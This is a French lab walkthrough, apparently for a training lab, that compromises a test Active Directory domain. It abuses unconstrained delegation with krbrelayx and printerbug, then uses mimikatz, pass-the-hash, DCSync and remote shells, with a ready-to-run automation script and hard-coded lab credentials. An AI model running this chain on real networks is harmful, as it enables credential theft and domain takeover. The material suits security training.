# krbrelayx - Unconstrained Delegation Attack from Kali Linux

## Contexte

Cette procédure permet d'exploiter l'**unconstrained delegation** sur FILES01 depuis Kali Linux en utilisant **krbrelayx** et **printerbug.py**. L'attaque force le contrôleur de domaine DC01 à s'authentifier auprès de notre machine attaquante, nous permettant de capturer son TGT et de compromettre le domaine.

**Prérequis** :
- Accès initial à FILES01 (serveur avec unconstrained delegation)
- Compte domaine valide (ex: adam)
- Résolution DNS configurée vers le DC

## Architecture de l'attaque

```
[Kali - krbrelayx]  -----> [DC01] : Force authentication via PrinterBug
       ↑                      |
       |                      | Répond avec TGT de DC01$
       └──────────────────────┘
                              
[Kali] --> DCSync avec TGT de DC01$ --> Compromission domaine
```

---

## Phase 0 : Setup de l'environnement

### Installation du venv Python

```bash
# Créer le répertoire de travail
cd /Tools
git clone https://github.com/<votre-repo>/krbrelayx.git
cd krbrelayx

# Créer et activer l'environnement virtuel
python3 -m venv venv
source venv/bin/activate

# Installer les dépendances
pip install --upgrade pip
pip install impacket dnspython ldap3 pyasn1

# Vérifier l'installation
python krbrelayx.py -h
```

### Configuration DNS

Configurer Kali pour utiliser le DC comme serveur DNS :

```bash
# Backup de la config DNS actuelle
sudo cp /etc/resolv.conf /etc/resolv.conf.bak

# Éditer /etc/resolv.conf
sudo nano /etc/resolv.conf
```

Contenu :
```
search corp.com
nameserver 192.168.136.100
```

Vérifier la résolution :
```bash
nslookup dc01.corp.com
nslookup files01.corp.com
```

---

## Phase 1 : Reconnaissance

### Vérifier le PrintSpooler sur DC01

```bash
# Méthode 1 : NetExec
nxc smb 192.168.136.100 -M spooler

# Méthode 2 : rpcdump
rpcdump.py @192.168.136.100 | egrep 'MS-RPRN|MS-PAR'
```

### Obtenir les informations de FILES01

Depuis FILES01 compromis, extraire les credentials :

```powershell
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

Output attendu :
```
Authentication Id : 0 ; 532412 (00000000:00081fbc)
User Name         : Administrator
Domain            : FILES01
NTLM              : 96b927ecd4785badb8b50bc175c101c4
```

Depuis Kali, effectuer un DCSync via FILES01 (qui a les droits de réplication) :

```bash
secretsdump.py 'corp.com/administrator@192.168.136.100' -hashes ':96b927ecd4785badb8b50bc175c101c4'
```

**Informations cruciales à récupérer** :
```
FILES01$:aes256-cts-hmac-sha1-96:00ba3cfd9198fa8a6dc795324242810e98c7d36d083bd811fdfe204ef30cc7a7
Administrator:500:aad3b435b51404eeaad3b435b51404ee:96b927ecd4785badb8b50bc175c101c4:::
```

---

## Phase 2 : Configuration DNS et SPN

### Étape 1 : Ajouter l'enregistrement DNS pour l'attaquant

```bash
cd /Tools/krbrelayx
source venv/bin/activate

python3 dnstool.py \
  -u CORP\\adam \
  -p 4Toolsfigure3 \
  -r attacker.corp.com \
  -a add \
  -t A \
  -d 192.168.45.239 \
  -dc-ip 192.168.136.100 \
  dc01.corp.com
```

**Explication des paramètres** :
- `-u CORP\\adam` : Compte du domaine avec droits DNS (utilisateur standard suffit)
- `-p 4Toolsfigure3` : Mot de passe du compte
- `-r attacker.corp.com` : Nom de l'enregistrement DNS à créer
- `-a add` : Action "ajouter"
- `-t A` : Type d'enregistrement (A = IPv4)
- `-d 192.168.45.239` : **IP de votre Kali** (adaptez selon votre IP)
- `-dc-ip 192.168.136.100` : IP du contrôleur de domaine
- `dc01.corp.com` : Hostname du DC (argument HOSTNAME obligatoire)

**Vérification** :
```bash
nslookup attacker.corp.com
# Doit retourner votre IP Kali
```

### Étape 2 : Vérifier le SPN existant de FILES01

```bash
python3 addspn.py \
  -u CORP\\adam \
  -p 4Toolsfigure3 \
  -t FILES01$ \
  -q \
  -dc-ip 192.168.136.100 \
  dc01.corp.com
```

Output attendu :
```
servicePrincipalName: cifs/files01.corp.com
                      WSMAN/FILES01
                      HOST/FILES01.corp.com
                      ...
```

> ✅ Si `cifs/files01.corp.com` existe, c'est bon. Sinon, l'ajouter avec un compte privilégié.

### Étape 3 : Ajouter le SPN CIFS pour attacker.corp.com

**⚠️ CRITIQUE** : Cette étape évite l'erreur `Unsupported MechType 'NTLMSSP'`

Le SPN `cifs/attacker.corp.com` sur le compte machine FILES01$ force le DC à utiliser Kerberos au lieu de NTLM lors de la connexion retour.

```bash
python3 addspn.py \
  -u "CORP\\Administrator" \
  -p "aad3b435b51404eeaad3b435b51404ee:96b927ecd4785badb8b50bc175c101c4" \
  -t FILES01$ \
  -s cifs/attacker.corp.com \
  -dc-ip 192.168.136.100 \
  dc01.corp.com
```

**Explication** :
- `-u "CORP\\Administrator"` : Compte avec droits pour modifier les SPN (Domain Admin)
- `-p "LM:NTLM"` : Hash NTLM de l'administrateur (format Pass-the-Hash)
- `-t FILES01$` : Compte machine cible (celui avec unconstrained delegation)
- `-s cifs/attacker.corp.com` : SPN à ajouter
- **Pourquoi** : Quand DC01 contactera `attacker.corp.com`, il verra le SPN CIFS et utilisera Kerberos

> 📝 **Note** : Utilisez le hash de l'administrateur local de FILES01 ou du domain admin.

---

## Phase 3 : Lancement de l'attaque

### Étape 1 : Arrêter les services conflictuels

krbrelayx nécessite les ports 53 (DNS), 80 (HTTP), et 445 (SMB).

```bash
# Arrêter systemd-resolved (port 53)
sudo systemctl stop systemd-resolved-varlink.socket
sudo systemctl stop systemd-resolved-monitor.socket
sudo systemctl stop systemd-resolved

# Arrêter Traefik si installé (port 80)
sudo systemctl stop traefik

# Vérifier les ports
sudo ss -tlnp | grep -E ':(53|80|445) '
```

### Étape 2 : Démarrer krbrelayx

**⚠️ Utiliser l'AES Key de FILES01$, PAS du DC !**

```bash
cd /Tools/krbrelayx
source venv/bin/activate

sudo python3 krbrelayx.py \
  -t attacker.corp.com \
  -r dc01.corp.com \
  -l /tmp/tickets \
  -f ccache \
  -s "CORP\\FILES01$" \
  -aesKey 00ba3cfd9198fa8a6dc795324242810e98c7d36d083bd811fdfe204ef30cc7a7 \
  -dc-ip 192.168.136.100
```

**Explication des paramètres** :
- `-t attacker.corp.com` : Target (notre machine attaquante)
- `-r dc01.corp.com` : Relay target (le DC à attaquer)
- `-l /tmp/tickets` : Dossier pour sauvegarder les tickets capturés
- `-f ccache` : Format du ticket (ccache pour Impacket)
- `-s "CORP\\FILES01$"` : **Service principal** - Le compte avec unconstrained delegation
- `-aesKey XXX` : **AES-256 key de FILES01$** (obtenue via secretsdump)
- `-dc-ip 192.168.136.100` : IP du DC

**Pourquoi l'AES key de FILES01$ ?**
- FILES01$ est configuré avec unconstrained delegation
- krbrelayx s'authentifie EN TANT QUE FILES01$ auprès du DC
- Quand DC01 répond, il transfère son TGT à FILES01$ (notre krbrelayx)
- L'AES key permet à krbrelayx de déchiffrer la réponse Kerberos

Output attendu :
```
[*] Protocol Client HTTP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Running in unconstrained delegation abuse mode using the specified credentials.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server
[*] Servers started, waiting for connections
```

### Étape 3 : Déclencher le PrinterBug

Dans un **nouveau terminal** (laisser krbrelayx tourner) :

```bash
cd /Tools/krbrelayx
source venv/bin/activate

python3 printerbug.py \
  "corp/adam:4Toolsfigure3@dc01.corp.com" \
  attacker.corp.com \
  -dc-ip 192.168.136.100 \
  -no-ping
```

**Explication** :
- `corp/adam:password@dc01.corp.com` : Credentials pour déclencher le bug sur le DC
- `attacker.corp.com` : Serveur de capture (notre krbrelayx)
- `-dc-ip 192.168.136.100` : IP du DC
- `-no-ping` : Ne pas vérifier la connectivité par ping

Output attendu :
```
INFO: Attempting to trigger authentication via rprn RPC at dc01.corp.com
INFO: Bind OK
INFO: Got handle
INFO: Triggered RPC backconnect, this may or may not have worked
```

### Étape 4 : Vérifier la capture du ticket

Retour sur le terminal de krbrelayx :
```
[*] SMBD: Received connection from 192.168.136.100
[*] Got ticket for DC01$@CORP.COM [krbtgt@CORP.COM]
[*] Saving ticket in DC01$@CORP.COM_krbtgt@CORP.COM.ccache
```

✅ **Succès !** Le TGT de DC01$ est capturé.

---

## Phase 4 : Exploitation du TGT

### Étape 1 : Configurer le ticket Kerberos

```bash
cd /tmp/tickets
export KRB5CCNAME="$PWD/DC01\$@CORP.COM_krbtgt@CORP.COM.ccache"

# Vérifier le ticket
klist
```

### Étape 2 : DCSync avec le TGT de DC01$

Le compte machine DC01$ possède les droits de réplication (DCSync).

```bash
secretsdump.py \
  -k \
  -no-pass \
  -just-dc-user Administrator \
  -dc-ip 192.168.136.100 \
  corp.com/DC01\$@dc01.corp.com
```

**Explication** :
- `-k` : Utiliser l'authentification Kerberos
- `-no-pass` : Pas de mot de passe (utilise le ticket dans KRB5CCNAME)
- `-just-dc-user Administrator` : Ne dumper que l'utilisateur Administrator
- `corp.com/DC01\$@dc01.corp.com` : Format UPN du compte machine

Output :
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:96b927ecd4785badb8b50bc175c101c4:::
```

### Étape 3 : Obtenir un shell sur le DC

**Option 1 : smbexec.py**
```bash
smbexec.py \
  -hashes :96b927ecd4785badb8b50bc175c101c4 \
  corp.com/Administrator@dc01.corp.com
```

**Option 2 : evil-winrm**
```bash
evil-winrm \
  -i 192.168.136.100 \
  -u Administrator \
  -H 96b927ecd4785badb8b50bc175c101c4
```

### Étape 4 : Récupérer le flag

```powershell
C:\Windows\system32> hostname
DC01

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\proof.txt
OS{ac1b63242f30440efafcfcad001cf8db}
```

---

## Résumé des Hash utilisés

| Hash | Compte | Usage | Source |
|------|--------|-------|--------|
| `96b927ecd4785badb8b50bc175c101c4` | FILES01\Administrator (local) | Pass-the-Hash pour secretsdump initial | mimikatz sur FILES01 |
| `00ba3cfd9198fa8a6dc795324242810e98c7d36d083bd811fdfe204ef30cc7a7` | FILES01$ (AES-256) | krbrelayx pour s'authentifier comme FILES01$ | secretsdump NTDS.dit |
| `96b927ecd4785badb8b50bc175c101c4` | CORP\Administrator (domain) | Shell final sur DC01 | secretsdump via TGT de DC01$ |

---

## Procédure One-Shot depuis un clone neuf

```bash
#!/bin/bash
# Script d'exploitation automatisée

# Variables (à adapter)
KALI_IP="192.168.45.239"
DC_IP="192.168.136.100"
FILES01_ADMIN_HASH="96b927ecd4785badb8b50bc175c101c4"
FILES01_AES_KEY="00ba3cfd9198fa8a6dc795324242810e98c7d36d083bd811fdfe204ef30cc7a7"
DOMAIN_USER="adam"
DOMAIN_PASS="4Toolsfigure3"

# Setup DNS
echo "search corp.com" | sudo tee /etc/resolv.conf
echo "nameserver $DC_IP" | sudo tee -a /etc/resolv.conf

# Setup venv
cd /Tools/krbrelayx
python3 -m venv venv
source venv/bin/activate
pip install -q impacket dnspython ldap3 pyasn1

# Ajouter DNS record
python3 dnstool.py -u "CORP\\$DOMAIN_USER" -p "$DOMAIN_PASS" \
  -r attacker.corp.com -a add -t A -d $KALI_IP -dc-ip $DC_IP dc01.corp.com

# Ajouter SPN
python3 addspn.py -u "CORP\\Administrator" \
  -p "aad3b435b51404eeaad3b435b51404ee:$FILES01_ADMIN_HASH" \
  -t FILES01$ -s cifs/attacker.corp.com -dc-ip $DC_IP dc01.corp.com

# Arrêter services conflictuels
sudo systemctl stop systemd-resolved traefik 2>/dev/null

# Lancer krbrelayx en background
sudo python3 krbrelayx.py -t attacker.corp.com -r dc01.corp.com \
  -l /tmp/tickets -f ccache -s "CORP\\FILES01$" \
  -aesKey $FILES01_AES_KEY -dc-ip $DC_IP &

RELAY_PID=$!
sleep 5

# Déclencher PrinterBug
python3 printerbug.py "corp/$DOMAIN_USER:$DOMAIN_PASS@dc01.corp.com" \
  attacker.corp.com -dc-ip $DC_IP -no-ping

# Attendre la capture
sleep 10
sudo kill $RELAY_PID

# Exporter le ticket
export KRB5CCNAME="/tmp/tickets/DC01\$@CORP.COM_krbtgt@CORP.COM.ccache"

# DCSync
secretsdump.py -k -no-pass -just-dc-user Administrator \
  -dc-ip $DC_IP corp.com/DC01\$@dc01.corp.com

echo "[+] Hash récupéré, connectez-vous avec evil-winrm !"
```

---

## Troubleshooting

### Erreur : `Unsupported MechType 'NTLMSSP'`

**Cause** : DC01 utilise NTLM au lieu de Kerberos pour se connecter.

**Solution** : Ajouter le SPN `cifs/attacker.corp.com` sur FILES01$ (voir Phase 2, Étape 3).

### Erreur : `NXDOMAIN` pour attacker.corp.com

**Cause** : L'enregistrement DNS n'est pas propagé.

**Solution** :
1. Attendre 30 secondes
2. Vérifier avec `nslookup attacker.corp.com`
3. Réessayer `dnstool.py` si nécessaire

### Erreur : Port 53/80/445 déjà utilisé

**Cause** : Services système en conflit.

**Solution** :
```bash
sudo ss -tlnp | grep -E ':(53|80|445) '
sudo systemctl stop systemd-resolved traefik apache2 nginx
```

### krbrelayx ne reçoit rien

**Cause** : PrintSpooler désactivé ou firewall.

**Vérification** :
```bash
nxc smb $DC_IP -M spooler
```

---

## Références

- [krbrelayx GitHub](https://github.com/dirkjanm/krbrelayx)
- [Impacket GitHub](https://github.com/fortra/impacket)
- [SpoolSample Technique](https://github.com/leechristensen/SpoolSample)
- [Unconstrained Delegation Abuse](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)

---

**Date de dernière mise à jour** : 3 février 2026
**Lab validé** : ✅ OS{ac1b63242f30440efafcfcad001cf8db}
